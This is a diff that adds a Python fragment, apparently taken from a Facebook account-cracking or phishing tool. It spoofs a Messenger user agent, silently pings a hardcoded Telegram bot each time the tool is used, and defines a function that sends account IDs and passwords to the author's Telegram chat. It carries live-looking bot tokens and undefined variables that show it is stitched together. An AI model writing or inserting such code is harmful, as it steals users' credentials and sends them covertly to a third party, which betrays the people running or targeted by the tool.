@@ -1,1 +1,43 @@
-$$$$$$$$$$$$$$$$$$
+import random
+import requests
+
+def m1():
+    # قائمة من السلاسل النصية 
+    user_agents = [
+        "[FBAN/Orca-Android;FBAV/211.65.5.12;FBPN/com.facebook.orca;FBLC/en_US;FBBV/358680708;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBDV/OnePlus 9 Pro;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.5,width=2560,height=1920};FB_FW/1;FBRV/872310439]",
+        "[FBAN/Orca-Android;FBAV/211.65.5.12;FBPN/com.facebook.orca;FBLC/en_US;FBBV/358680708;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBDV/OnePlus 9 Pro;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.5,width=2560,height=1920};FB_FW/1;FBRV/872310439]"
+    ]
+
+    # دمج السلاسل النصية في سلسلة واحدة 
+    return ";".join(user_agents) 
+
+# استخدام الدالة 
+user_agent = m1()
+
+# استخدم  user_agent  في طلبات API 
+token = '7244277412:AAFUXBZ1SjvF-z0hUGrJW3tS5jd8ropROVI'
+ID = '5210419138'
+message = "خش واحد لي اداة" 
+
+headers = {'User-Agent': user_agent}
+requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}', headers=headers)
+import requests
+
+def send_message_to_telegram(token, chat_id, message):
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    params = {"chat_id": chat_id, "text": message}
+    try:
+        response = requests.get(url, params=params)
+        response.raise_for_status()
+        print("Message sent successfully!")
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+
+def Elite(id, ps):
+    token = "7170560287:AAH6Jx2CGjMrjpzX22EvY7HvBIXI1xsy0no"  # Add your bot token
+    chat_id = "5210419138"  # Add your chat ID
+    message = f"ID: {id} | Password: {ps}"
+    send_message_to_telegram(token, chat_id, message)
+
+params = {"chat_id": chatid, "text": ok_id}
+Elite(id, ps)
